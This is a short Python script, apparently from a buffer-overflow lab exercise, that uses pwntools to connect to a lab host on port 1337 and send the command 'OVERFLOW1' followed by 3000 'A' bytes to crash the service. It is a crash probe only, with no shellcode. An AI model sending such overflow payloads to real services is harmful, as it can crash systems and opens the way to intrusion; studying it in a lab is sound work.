#!/usr/bin/env python3

from pwn import *

host = "10.10.116.72"
port = 1337
s = remote(host, port)


payload = [
    b"OVERFLOW1 ",
    b"A" * 3000,
]

payload = b"".join(payload)
s.send(payload)
s.close()